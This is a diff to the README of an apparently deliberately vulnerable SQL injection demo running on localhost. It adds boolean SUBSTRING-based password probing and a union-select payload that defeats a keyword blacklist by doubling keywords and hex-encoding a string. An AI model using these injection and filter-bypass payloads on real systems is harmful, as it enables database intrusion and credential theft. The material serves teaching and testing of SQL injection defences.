@@ -66,6 +66,9 @@ curl localhost:5808/sqlidemo/add -d username=user -d password=password
 curl localhost:5808/sqlidemo/vulnbyid2 -d id="1' AND SUBSTRING(password,1,1)='p" 
 curl localhost:5808/sqlidemo/vulnbyid2 -d id="1' AND SUBSTRING(password,1,1)='a" 
 ```
+
+Check id and used password against database. If one of both doesn't exist you will get a 500.
+
 #### Blacklist 
 
 For the JDBC based vulnerable rest endpoint a blacklist filter is implemented which can be applied.
@@ -192,6 +195,9 @@ block_base64,\
 block_char_function
 ```
 
+```
+curl http://localhost:5808/sqlidemo/vulnbyid -d id="1' unionunion select select null,null,(select variable_value from information_schema.global_variables where variable_name=0x56455253494f4e) as username from user where id='1" -d blacklistconfig=add_oddsinglequotes,strip_keywordsequences,block_comment_doubledash,block_comment_hash,block_anyuppercase,block_badstrings,block_concatenation,block_base64,block_char_function
+```
 ## Safe Implementation
 
 ### Java based
